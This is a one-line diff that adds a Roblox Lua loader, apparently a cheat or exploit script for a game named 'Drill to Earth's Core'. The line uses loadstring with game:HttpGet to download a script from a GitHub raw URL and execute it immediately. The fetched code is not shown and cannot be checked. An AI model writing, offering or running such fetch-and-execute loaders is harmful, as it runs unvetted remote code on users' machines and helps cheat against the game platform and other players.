@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/drill-to-earth-s-core-spam5-ljpse6ghm6j95b.lua"))()
